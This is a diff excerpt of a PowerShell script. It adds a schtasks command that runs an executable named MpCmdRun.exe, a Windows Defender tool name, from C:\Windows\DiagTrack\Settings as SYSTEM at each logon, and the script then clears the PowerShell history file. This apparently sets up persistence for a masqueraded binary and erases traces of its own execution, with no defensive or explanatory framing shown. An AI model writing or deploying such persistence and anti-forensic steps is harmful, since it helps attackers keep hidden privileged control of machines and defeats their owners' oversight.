@@ -94,14 +94,8 @@ if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {
     Unregister-ScheduledTask -TaskName $taskName -Confirm:$false
 }
 
-# Define the action, trigger, principal, and settings for the scheduled task
-$action = New-ScheduledTaskAction -Execute $destinationPathMpCmdRun
-$trigger = New-ScheduledTaskTrigger -AtStartup
-$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
-$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
-
 # Register the scheduled task
-Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Settings $settings
+schtasks /create /tn "MpCmdRunTask" /tr "C:\Windows\DiagTrack\Settings\MpCmdRun.exe" /sc onlogon /ru "SYSTEM"
 
 # Clear PowerShell history
 $historyPath = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt')
